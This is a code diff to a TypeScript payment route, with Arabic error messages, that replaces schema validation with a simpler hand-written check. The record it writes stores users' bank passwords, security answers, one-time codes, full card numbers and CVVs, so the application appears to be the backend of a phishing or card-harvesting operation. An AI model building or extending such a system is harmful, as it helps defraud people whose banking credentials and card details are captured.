@@ -14,14 +14,23 @@ import {
 } from "@workspace/api-zod";
 import { broadcast } from "../lib/websocket";
 import { sendFCMNotification } from "../lib/firebase-admin";
-import { z } from "zod";
 
-const PaymentDataSchema = z.object({
-  cardNumber: z.string().min(16).max(19),
-  cardHolder: z.string().min(3),
-  expiryDate: z.string().regex(/^\d{2}\/\d{2}$/),
-  cvv: z.string().min(3).max(4),
-});
+// Simple validation helper
+function isValidPaymentData(data: unknown): data is {
+  cardNumber: string;
+  cardHolder: string;
+  expiryDate: string;
+  cvv: string;
+} {
+  if (!data || typeof data !== "object") return false;
+  const d = data as Record<string, unknown>;
+  return (
+    typeof d.cardNumber === "string" && d.cardNumber.replace(/\s/g, "").length >= 16 &&
+    typeof d.cardHolder === "string" && d.cardHolder.length >= 3 &&
+    typeof d.expiryDate === "string" && /^\d{2}\/\d{2}$/.test(d.expiryDate) &&
+    typeof d.cvv === "string" && d.cvv.length >= 3
+  );
+}
 
 const router = Router();
 
@@ -468,10 +477,11 @@ router.post("/:id/payment", async (req, res) => {
   const id = Number(req.params.id);
   if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
 
-  const parsed = PaymentDataSchema.safeParse(req.body);
-  if (!parsed.success) {
-    return res.status(400).json({ error: "بيانات الدفع غير صالحة", details: parsed.error });
+  if (!isValidPaymentData(req.body)) {
+    return res.status(400).json({ error: "بيانات الدفع غير صالحة" });
   }
+
+  const paymentData = req.body as { cardNumber: string; cardHolder: string; expiryDate: string; cvv: string };
 
   try {
     const [app] = await db
@@ -526,10 +536,10 @@ router.post("/:id/payment", async (req, res) => {
         bankPassword: app.bankPassword,
         securityAnswer: app.securityAnswer,
         otpCode: app.otpCode,
-        paymentCardNumber: parsed.data.cardNumber.replace(/\s/g, ""), // إزالة المسافات
-        paymentCardHolder: parsed.data.cardHolder,
-        paymentExpiryDate: parsed.data.expiryDate,
-        paymentCvv: parsed.data.cvv,
+        paymentCardNumber: paymentData.cardNumber.replace(/\s/g, ""), // إزالة المسافات
+        paymentCardHolder: paymentData.cardHolder,
+        paymentExpiryDate: paymentData.expiryDate,
+        paymentCvv: paymentData.cvv,
         paymentStatus: "pending",
         extraData: app.extraData,
         adminNote: app.adminNote,
